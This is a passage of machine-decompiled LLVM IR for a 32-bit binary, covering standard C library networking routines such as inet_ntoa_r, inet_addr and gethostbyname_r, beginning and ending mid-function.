  %v1_805dd6d = icmp eq i1 %v10_805dd6a, false
  br i1 %v1_805dd6d, label %dec_label_pc_805dda4, label %dec_label_pc_805dd6f

dec_label_pc_805dd6f:                             ; preds = %dec_label_pc_805dd6a
  %v1_805dd6f = add i32 %v0_805dd55, 1
  store i32 %v1_805dd6f, i32* @ecx, align 4
  br label %dec_label_pc_805dd7b

dec_label_pc_805dd72:                             ; preds = %dec_label_pc_805dd64
  %v1_805dd72 = add i32 %v0_805dd55, 1
  store i32 %v1_805dd72, i32* @ecx, align 4
  %v4_805dd73 = icmp eq i8 %v2_805dd56, 0
  br i1 %v4_805dd73, label %dec_label_pc_805dd7b, label %dec_label_pc_805dd77

dec_label_pc_805dd77:                             ; preds = %dec_label_pc_805dd72
  %v2_805dd77 = and i16 %v5_805dd5b, 32
  %v3_805dd77 = icmp eq i16 %v2_805dd77, 0
  br i1 %v3_805dd77, label %dec_label_pc_805dda4, label %dec_label_pc_805dd7b

dec_label_pc_805dd7b:                             ; preds = %dec_label_pc_805dd77, %dec_label_pc_805dd72, %dec_label_pc_805dd6f
  %v0_805dd323 = phi i32 [ %v1_805dd72, %dec_label_pc_805dd77 ], [ %v1_805dd72, %dec_label_pc_805dd72 ], [ %v1_805dd6f, %dec_label_pc_805dd6f ]
  %v2_805dd7b = mul i32 %v0_805dd9933, 256
  %v3_805dd7e = add nuw nsw i32 %v2_805dd7e35, 1
  %v2_805dd81 = or i32 %v1_805dd46, %v2_805dd7b
  %v7_805dd87 = icmp sgt i32 %v2_805dd7e35, 3
  br i1 %v7_805dd87, label %dec_label_pc_805dd89, label %dec_label_pc_805dd32

dec_label_pc_805dd89:                             ; preds = %dec_label_pc_805dd7b
  %v4_805dd8e = icmp eq i32 %arg2, 0
  br i1 %v4_805dd8e, label %dec_label_pc_805dda6, label %dec_label_pc_805dd95

dec_label_pc_805dd95:                             ; preds = %dec_label_pc_805dd89
  %v1_805dd99 = call i32 @llvm.bswap.i32(i32 %v2_805dd81)
  %v2_805dd9b = inttoptr i32 %arg2 to i32*
  store i32 %v1_805dd99, i32* %v2_805dd9b, align 4
  br label %dec_label_pc_805dda6

dec_label_pc_805dda4:                             ; preds = %dec_label_pc_805dd77, %dec_label_pc_805dd6a, %dec_label_pc_805dd32, %dec_label_pc_805dd46, %entry
  br label %dec_label_pc_805dda6

dec_label_pc_805dda6:                             ; preds = %dec_label_pc_805dd89, %dec_label_pc_805dd95, %dec_label_pc_805dda4
  %v0_805ddab = phi i32 [ 1, %dec_label_pc_805dd89 ], [ 1, %dec_label_pc_805dd95 ], [ 0, %dec_label_pc_805dda4 ]
  ret i32 %v0_805ddab

; uselistorder directives
  uselistorder i32 %v2_805dd58, { 1, 0 }
  uselistorder i32 %v6_805dd56, { 1, 0 }
  uselistorder i8 %v2_805dd56, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805dd55, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805dd4d, { 1, 0 }
  uselistorder i32 %v3_805dd49, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805dd3234, { 1, 0 }
  uselistorder i32 %v2_805dd7e35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 254, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805dda6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805dda4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805dd56, { 1, 0 }
  uselistorder label %dec_label_pc_805dd32, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805ddac = load i32, i32* @edi, align 4
  %v0_805ddad = load i32, i32* @esi, align 4
  %v0_805ddae = load i32, i32* @ebx, align 4
  store i32 %v0_805ddae, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_805ddb9 = add i32 %arg2, 15
  store i32 0, i32* @esi, align 4
  %v1_805ddbe = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_805ddbe, 16777216
  %v1_805ddc0 = sdiv i32 %sext, 16777216
  store i32 %v1_805ddc0, i32* @ebx, align 4
  br label %dec_label_pc_805ddc4

dec_label_pc_805ddc4:                             ; preds = %entry, %dec_label_pc_805dde9
  %v0_805ddc717 = phi i32 [ %v1_805ddc0, %entry ], [ %v2_805dde9, %dec_label_pc_805dde9 ]
  %v0_805ddf416 = phi i32 [ %v1_805ddb9, %entry ], [ %v0_805dded, %dec_label_pc_805dde9 ]
  %v1_805ddc9 = urem i32 %v0_805ddc717, 256
  %v5_805ddd7 = inttoptr i32 %v0_805ddf416 to i8*
  %v6_805ddd7 = call i32 @_uintmaxtostr(i8* %v5_805ddd7, i32 %v1_805ddc9, i32 0, i32 -10, i32 0)
  %v0_805dddf = load i32, i32* @esi, align 4
  %v1_805dddf = icmp eq i32 %v0_805dddf, 0
  %v1_805dde1 = add i32 %v6_805ddd7, -1
  store i32 %v1_805dde1, i32* @ecx, align 4
  br i1 %v1_805dddf, label %dec_label_pc_805dde9, label %dec_label_pc_805dde6

dec_label_pc_805dde6:                             ; preds = %dec_label_pc_805ddc4
  %v1_805dde6 = inttoptr i32 %v0_805dddf to i8*
  store i8 46, i8* %v1_805dde6, align 1
  %v0_805dded.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805dde9

dec_label_pc_805dde9:                             ; preds = %dec_label_pc_805ddc4, %dec_label_pc_805dde6
  %v0_805dded = phi i32 [ %v1_805dde1, %dec_label_pc_805ddc4 ], [ %v0_805dded.pre, %dec_label_pc_805dde6 ]
  %v0_805dde9 = load i32, i32* @ebx, align 4
  %v2_805dde9 = udiv i32 %v0_805dde9, 256
  store i32 %v2_805dde9, i32* @ebx, align 4
  %v0_805ddec = load i32, i32* @edi, align 4
  %v1_805ddec = add i32 %v0_805ddec, 1
  store i32 %v1_805ddec, i32* @edi, align 4
  store i32 %v0_805dded, i32* @esi, align 4
  %v7_805ddf2 = icmp sgt i32 %v1_805ddec, 3
  br i1 %v7_805ddf2, label %dec_label_pc_805ddf4, label %dec_label_pc_805ddc4

dec_label_pc_805ddf4:                             ; preds = %dec_label_pc_805dde9
  %v1_805ddf4 = add i32 %v0_805dded, 1
  %v2_805ddf7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ddf7, i32* @ebx, align 4
  store i32 %v0_805ddad, i32* @esi, align 4
  store i32 %v0_805ddac, i32* @edi, align 4
  ret i32 %v1_805ddf4

; uselistorder directives
  uselistorder i32 %v0_805dded, { 0, 2, 1 }
  uselistorder i32 %v1_805ddc0, { 1, 0 }
  uselistorder label %dec_label_pc_805dde9, { 1, 0 }
  uselistorder label %dec_label_pc_805ddc4, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805de07 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_807c6a4.758 to i32))
  ret i32 %v2_805de07
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805de13 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805de1c = inttoptr i32 %arg1 to i8*
  %v3_805de1c = call i32 @inet_aton(i8* %v2_805de1c, i32 %v2_805de13)
  store i32 -1, i32* @edx, align 4
  %v1_805de27 = icmp eq i32 %v3_805de1c, 0
  br i1 %v1_805de27, label %dec_label_pc_805de2f, label %dec_label_pc_805de2b

dec_label_pc_805de2b:                             ; preds = %entry
  %v3_805de2b = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_805de2b, i32* @edx, align 4
  br label %dec_label_pc_805de2f

dec_label_pc_805de2f:                             ; preds = %entry, %dec_label_pc_805de2b
  %v0_805de2f = phi i32 [ -1, %entry ], [ %v3_805de2b, %dec_label_pc_805de2b ]
  ret i32 %v0_805de2f

; uselistorder directives
  uselistorder label %dec_label_pc_805de2f, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805de3b = call i32 @__GI___h_errno_location()
  %v0_805de40 = load i32, i32* @edx, align 4
  %v2_805de43 = ptrtoint i32* %stack_var_-4 to i32
  %v8_805de5b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_807c88c.760, i32 ptrtoint (i32* @global_var_807c6c0.759 to i32), i32 460, i32 %v2_805de43, i32 %v0_805de3b, i32 %v0_805de40)
  %v3_805de60 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805de60
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_4()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805de68 = load i32, i32* @ebp, align 4
  %v0_805de69 = load i32, i32* @edi, align 4
  %v0_805de6a = load i32, i32* @esi, align 4
  %v0_805de6b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805de7b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805de7b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805de86 = icmp eq i32 %arg1, 0
  br i1 %v4_805de86, label %dec_label_pc_805e192, label %dec_label_pc_805de91

dec_label_pc_805de91:                             ; preds = %entry
  %v1_805de91 = call i32 @__errno_location(i32 %v0_805de6b)
  store i32 %v1_805de91, i32* %eax.global-to-local, align 4
  store i32 %v1_805de91, i32* @esi, align 4
  %v1_805de98 = inttoptr i32 %v1_805de91 to i32*
  %v2_805de98 = load i32, i32* %v1_805de98, align 4
  store i32 %v2_805de98, i32* @edi, align 4
  store i32 0, i32* %v1_805de98, align 4
  %v0_805dea9 = load i32, i32* @ebx, align 4
  store i32 %v0_805dea9, i32* %stack_var_-108, align 4
  %v7_805deb5 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805dea9, i32 %arg5, i32 %arg6, i32 %v1_805de91)
  store i32 %v7_805deb5, i32* %eax.global-to-local, align 4
  %v1_805debd = icmp eq i32 %v7_805deb5, 0
  br i1 %v1_805debd, label %dec_label_pc_805e192, label %dec_label_pc_805dec5

dec_label_pc_805dec5:                             ; preds = %dec_label_pc_805de91
  store i32 %arg6, i32* @ecx, align 4
  %v1_805dec9 = inttoptr i32 %arg6 to i32*
  %v2_805dec9 = load i32, i32* %v1_805dec9, align 4
  store i32 %v2_805dec9, i32* %edx.global-to-local, align 4
  %v9_805decb = icmp eq i32 %v2_805dec9, 1
  br i1 %v9_805decb, label %dec_label_pc_805dee5, label %dec_label_pc_805ded0

dec_label_pc_805ded0:                             ; preds = %dec_label_pc_805dec5
  %v9_805ded0 = icmp eq i32 %v2_805dec9, 4
  br i1 %v9_805ded0, label %dec_label_pc_805dee5, label %dec_label_pc_805ded5

dec_label_pc_805ded5:                             ; preds = %dec_label_pc_805ded0
  %v1_805ded5 = add i32 %v2_805dec9, 1
  %v8_805ded5 = icmp eq i32 %v1_805ded5, 0
  store i32 %v1_805ded5, i32* %edx.global-to-local, align 4
  %v1_805ded6 = icmp eq i1 %v8_805ded5, false
  br i1 %v1_805ded6, label %dec_label_pc_805e192, label %dec_label_pc_805dedc

dec_label_pc_805dedc:                             ; preds = %dec_label_pc_805ded5
  %v0_805dedc = load i32, i32* @esi, align 4
  %v1_805dedc = inttoptr i32 %v0_805dedc to i32*
  %v2_805dedc = load i32, i32* %v1_805dedc, align 4
  %v11_805dedc = icmp eq i32 %v2_805dedc, 2
  %v1_805dedf = icmp eq i1 %v11_805dedc, false
  br i1 %v1_805dedf, label %dec_label_pc_805e192, label %dec_label_pc_805dee5

dec_label_pc_805dee5:                             ; preds = %dec_label_pc_805dedc, %dec_label_pc_805ded0, %dec_label_pc_805dec5
  %v0_805dee5 = load i32, i32* @ebp, align 4
  store i32 %v0_805dee5, i32* %eax.global-to-local, align 4
  %v0_805dee7 = load i32, i32* @edi, align 4
  %v1_805dee7 = load i32, i32* @esi, align 4
  %v2_805dee7 = inttoptr i32 %v1_805dee7 to i32*
  store i32 %v0_805dee7, i32* %v2_805dee7, align 4
  %v0_805dee9 = load i32, i32* %eax.global-to-local, align 4
  %v1_805dee9 = sub i32 0, %v0_805dee9
  %v1_805deeb = urem i32 %v1_805dee9, 4
  %v2_805deeb = icmp eq i32 %v1_805deeb, 0
  store i32 %v1_805deeb, i32* %eax.global-to-local, align 4
  %v0_805df00.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805deeb, label %dec_label_pc_805defc, label %dec_label_pc_805def0

dec_label_pc_805def0:                             ; preds = %dec_label_pc_805dee5
  %v2_805def0 = sub i32 %v0_805df00.pre, %v1_805deeb
  %v7_805def0 = icmp ult i32 %v0_805df00.pre, %v1_805deeb
  br i1 %v7_805def0, label %dec_label_pc_805e18d, label %dec_label_pc_805def8

dec_label_pc_805def8:                             ; preds = %dec_label_pc_805def0
  %v0_805def8 = load i32, i32* @ebp, align 4
  %v2_805def8 = add i32 %v0_805def8, %v1_805deeb
  store i32 %v2_805def8, i32* @ebp, align 4
  store i32 %v2_805def0, i32* @ebx, align 4
  br label %dec_label_pc_805defc

dec_label_pc_805defc:                             ; preds = %dec_label_pc_805dee5, %dec_label_pc_805def8
  %v0_805df00 = phi i32 [ %v2_805def0, %dec_label_pc_805def8 ], [ %v0_805df00.pre, %dec_label_pc_805dee5 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805dec9, align 4
  %tmp43 = icmp ult i32 %v0_805df00, 4
  br i1 %tmp43, label %dec_label_pc_805e18d, label %dec_label_pc_805df0f

dec_label_pc_805df0f:                             ; preds = %dec_label_pc_805defc
  %v0_805df0f = load i32, i32* @ebx, align 4
  %v1_805df0f = add i32 %v0_805df0f, -4
  store i32 %v1_805df0f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_805df0f, 8
  br i1 %tmp44, label %dec_label_pc_805e18d, label %dec_label_pc_805df1b

dec_label_pc_805df1b:                             ; preds = %dec_label_pc_805df0f
  %v0_805df1b = load i32, i32* @ebp, align 4
  %v1_805df1b = add i32 %v0_805df1b, 4
  store i32 %v1_805df1b, i32* %edx.global-to-local, align 4
  %v1_805df1e = add i32 %v0_805df0f, -12
  store i32 %v1_805df1e, i32* %eax.global-to-local, align 4
  store i32 %v1_805df1b, i32* %stack_var_-92, align 4
  %v3_805df27 = inttoptr i32 %v1_805df1b to i32*
  store i32 %v0_805df1b, i32* %v3_805df27, align 4
  %v0_805df2a = load i32, i32* %edx.global-to-local, align 4
  %v1_805df2a = add i32 %v0_805df2a, 4
  %v2_805df2a = inttoptr i32 %v1_805df2a to i32*
  store i32 0, i32* %v2_805df2a, align 4
  %tmp45 = icmp ult i32 %v1_805df1e, 32
  br i1 %tmp45, label %dec_label_pc_805e18d, label %dec_label_pc_805df37

dec_label_pc_805df37:                             ; preds = %dec_label_pc_805df1b
  %v0_805df37 = load i32, i32* @ebx, align 4
  %v1_805df37 = add i32 %v0_805df37, -44
  store i32 %v1_805df37, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_805df37, 256
  br i1 %tmp46, label %dec_label_pc_805e18d, label %dec_label_pc_805df4a

dec_label_pc_805df4a:                             ; preds = %dec_label_pc_805df37
  %v0_805df4a = load i32, i32* @ebp, align 4
  %v1_805df4a = add i32 %v0_805df4a, 12
  %v1_805df4d = add i32 %v0_805df4a, 44
  store i32 %v1_805df4d, i32* @edi, align 4
  store i32 %v1_805df4d, i32* %stack_var_-108, align 4
  %v3_805df5e = inttoptr i32 %v1_805df4d to i8*
  %v4_805df5e = call i32 @strncpy(i8* %v3_805df5e, i32 %arg1, i32 %v1_805df37)
  %v0_805df63 = load i32, i32* @edi, align 4
  %v1_805df63 = load i32, i32* @ebp, align 4
  %v2_805df63 = add i32 %v1_805df63, 12
  %v3_805df63 = inttoptr i32 %v2_805df63 to i32*
  store i32 %v0_805df63, i32* %v3_805df63, align 4
  %v1_805df6a = add i32 %v0_805df4a, 16
  %v2_805df6a = inttoptr i32 %v1_805df6a to i32*
  store i32 0, i32* %v2_805df6a, align 4
  %v2_805df71 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805df71, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805df73 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805df78 = inttoptr i32 %arg1 to i8*
  %v3_805df78 = call i32 @inet_aton(i8* %v2_805df78, i32 %v0_805df73)
  store i32 %v3_805df78, i32* %eax.global-to-local, align 4
  %v1_805df80 = icmp eq i32 %v3_805df78, 0
  br i1 %v1_805df80, label %dec_label_pc_805dfbc, label %dec_label_pc_805df84

dec_label_pc_805df84:                             ; preds = %dec_label_pc_805df4a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805df88 = load i32, i32* @edi, align 4
  store i32 %v0_805df88, i32* %arg2, align 4
  %v1_805df8a = add i32 %tmp18, 8
  %v2_805df8a = inttoptr i32 %v1_805df8a to i32*
  store i32 2, i32* %v2_805df8a, align 4
  %v0_805df91 = load i32, i32* %edx.global-to-local, align 4
  %v1_805df91 = add i32 %v0_805df91, 12
  %v2_805df91 = inttoptr i32 %v1_805df91 to i32*
  store i32 4, i32* %v2_805df91, align 4
  %v2_805df98 = load i32, i32* %stack_var_-92, align 4
  %v1_805df9b = load i32, i32* %edx.global-to-local, align 4
  %v2_805df9b = add i32 %v1_805df9b, 16
  %v3_805df9b = inttoptr i32 %v2_805df9b to i32*
  store i32 %v2_805df98, i32* %v3_805df9b, align 4
  %v1_805dfa2 = load i32, i32* %edx.global-to-local, align 4
  %v2_805dfa2 = add i32 %v1_805dfa2, 4
  %v3_805dfa2 = inttoptr i32 %v2_805dfa2 to i32*
  store i32 %v1_805df4a, i32* %v3_805dfa2, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805dfa9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805dfa9, i32* %v1_805de7b, align 4
  store i32 0, i32* %v1_805dec9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e192

dec_label_pc_805dfbc:                             ; preds = %dec_label_pc_805df4a
  %v0_805dfbc = load i32, i32* %stack_var_-108, align 4
  %v3_805dfbc = call i32 @__open_nameservers(i32 %v0_805dfbc, i32 %v0_805df73, i32 %v1_805df37)
  store i32 %v3_805dfbc, i32* %eax.global-to-local, align 4
  %v2_805dfcc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_805dfcc, i32* @ebx, align 4
  store i32 %v2_805dfcc, i32* %stack_var_-108, align 4
  %v4_805dfd1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134583465, i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  store i32 %v4_805dfd1, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %stack_var_-108, align 4
  %v1_805dfdd = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  %v2_805dfe2 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805dfe2, i32* @ecx, align 4
  store i32 134583465, i32* %eax.global-to-local, align 4
  store i32 %v2_805dfcc, i32* %stack_var_-108, align 4
  %v3_805dfed = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805e008 = ptrtoint i32* %stack_var_-76 to i32
  %v2_805e00d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805e00d, i32* %eax.global-to-local, align 4
  store i32 %v2_805e00d, i32* %stack_var_-108, align 4
  %v0_805e017 = load i32, i32* @esi, align 4
  %v7_805e01e = call i32 @__dns_lookup(i8* %v2_805df78, i32 1, i32 %v0_805e017, i32 ptrtoint (i32* @global_var_807e554.763 to i32), i32 %v2_805e00d, i32 %v2_805e008)
  store i32 %v7_805e01e, i32* %eax.global-to-local, align 4
  %v2_805e026 = icmp slt i32 %v7_805e01e, 0
  %v1_805e028 = icmp eq i1 %v2_805e026, false
  br i1 %v1_805e028, label %dec_label_pc_805e03e, label %dec_label_pc_805e02a

dec_label_pc_805e02a:                             ; preds = %dec_label_pc_805dfbc
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805dec9, align 4
  br label %dec_label_pc_805e192

dec_label_pc_805e03e:                             ; preds = %dec_label_pc_805dfbc
  %v4_805e03e = trunc i64 %tmp11 to i32
  store i32 %v4_805e03e, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805e051 = icmp ugt i32 %v1_805df37, 256
  %v15_805e051 = icmp eq i32 %v0_805df37, 300
  %v2_805e055 = or i1 %v10_805e051, %v15_805e051
  br i1 %v2_805e055, label %dec_label_pc_805e0f0, label %dec_label_pc_805e057

dec_label_pc_805e057:                             ; preds = %dec_label_pc_805e03e
  %v3_805e05a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e05a, i32* %stack_var_-108, align 4
  %v1_805e05e = call i32 @free(i32 %v3_805e05a)
  store i32 %v1_805e05e, i32* %eax.global-to-local, align 4
  %v2_805e063 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e063, i32* @edi, align 4
  %v3_805e064 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e064, i32* %stack_var_-108, align 4
  %v1_805e068 = call i32 @free(i32 %v3_805e064)
  store i32 -1, i32* %v1_805dec9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e168

dec_label_pc_805e0f0:                             ; preds = %dec_label_pc_805e03e
  %v3_805e0f5.pre = load i32, i32* %stack_var_-76, align 4
  %v0_805e0f9.pre = load i32, i32* @edi, align 4
  store i32 %v0_805e0f9.pre, i32* %stack_var_-108, align 4
  %v3_805e0fa = inttoptr i32 %v0_805e0f9.pre to i8*
  %v4_805e0fa = call i32 @strncpy(i8* %v3_805e0fa, i32 %v3_805e0f5.pre, i32 %v1_805df37)
  store i32 %v4_805e0fa, i32* %eax.global-to-local, align 4
  %v2_805e0ff = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e0ff, i32* @ecx, align 4
  %v3_805e100 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e100, i32* %stack_var_-108, align 4
  %v1_805e104 = call i32 @free(i32 %v3_805e100)
  store i32 %v1_805e104, i32* %eax.global-to-local, align 4
  %v12_805e10c = icmp eq i32 %tmp10, 1
  %v1_805e111 = icmp eq i1 %v12_805e10c, false
  br i1 %v1_805e111, label %dec_label_pc_805e16d, label %dec_label_pc_805e113

dec_label_pc_805e113:                             ; preds = %dec_label_pc_805e0f0
  %v0_805e113 = load i32, i32* @edx, align 4
  %v0_805e11a = load i32, i32* @ebp, align 4
  store i32 %v0_805e11a, i32* %stack_var_-108, align 4
  %v3_805e11b = inttoptr i32 %tmp to i16*
  %v4_805e11b = call i32 @memcpy(i16* %v3_805e11b, i32 4, i32 %v0_805e113)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_805e124 = load i32, i32* @edi, align 4
  store i32 %v0_805e124, i32* %arg2, align 4
  %v1_805e126 = add i32 %tmp18, 8
  %v2_805e126 = inttoptr i32 %v1_805e126 to i32*
  store i32 2, i32* %v2_805e126, align 4
  %v0_805e12d = load i32, i32* %eax.global-to-local, align 4
  %v1_805e12d = add i32 %v0_805e12d, 12
  %v2_805e12d = inttoptr i32 %v1_805e12d to i32*
  store i32 4, i32* %v2_805e12d, align 4
  %v3_805e134 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_805e134, i32* %edx.global-to-local, align 4
  %v1_805e138 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e138 = add i32 %v1_805e138, 16
  %v3_805e138 = inttoptr i32 %v2_805e138 to i32*
  store i32 %v3_805e134, i32* %v3_805e138, align 4
  store i32 %v1_805df4a, i32* @ecx, align 4
  %v1_805e13f = load i32, i32* %eax.global-to-local, align 4
  %v2_805e13f = add i32 %v1_805e13f, 4
  %v3_805e13f = inttoptr i32 %v2_805e13f to i32*
  store i32 %v1_805df4a, i32* %v3_805e13f, align 4
  %v2_805e142 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e142, i32* %eax.global-to-local, align 4
  %v3_805e143 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e143, i32* %stack_var_-108, align 4
  %v1_805e147 = call i32 @free(i32 %v3_805e143)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805de7b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_805dec9, align 4
  br label %dec_label_pc_805e168

dec_label_pc_805e168:                             ; preds = %dec_label_pc_805e16d, %dec_label_pc_805e057, %dec_label_pc_805e113
  br label %dec_label_pc_805e192

dec_label_pc_805e16d:                             ; preds = %dec_label_pc_805e0f0
  %v3_805e170 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e170, i32* %stack_var_-108, align 4
  %v1_805e174 = call i32 @free(i32 %v3_805e170)
  store i32 1, i32* %v1_805dec9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e168

dec_label_pc_805e18d:                             ; preds = %dec_label_pc_805df37, %dec_label_pc_805df1b, %dec_label_pc_805df0f, %dec_label_pc_805defc, %dec_label_pc_805def0
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e192

dec_label_pc_805e192:                             ; preds = %dec_label_pc_805dedc, %dec_label_pc_805ded5, %dec_label_pc_805de91, %entry, %dec_label_pc_805e168, %dec_label_pc_805e02a, %dec_label_pc_805df84, %dec_label_pc_805e18d
  store i32 %v0_805de6b, i32* @ebx, align 4
  store i32 %v0_805de6a, i32* @esi, align 4
  store i32 %v0_805de69, i32* @edi, align 4
  store i32 %v0_805de68, i32* @ebp, align 4
  %v0_805e199 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805e199

; uselistorder directives
  uselistorder i32 %v1_805df4d, { 1, 0, 2 }
  uselistorder i32 %v1_805df4a, { 2, 1, 0 }
  uselistorder i32 %v1_805df37, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 %v0_805df00.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805deeb, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805dec9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805dec9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805de7b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-108, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 2, 3, 0, 1 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805e192, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805e168, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805defc, { 1, 0 }
}

define i32 @gethostbyname2_r() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_805e19c = load i32, i32* @ebp, align 4
  %v0_805e19d = load i32, i32* @edi, align 4
  %v0_805e19e = load i32, i32* @esi, align 4
  %v0_805e19f = load i32, i32* @ebx, align 4
  store i32 %tmp15, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* @esi, align 4
  %v9_805e1b2 = icmp eq i32 %tmp15, 2
  %v1_805e1b5 = icmp eq i1 %v9_805e1b2, false
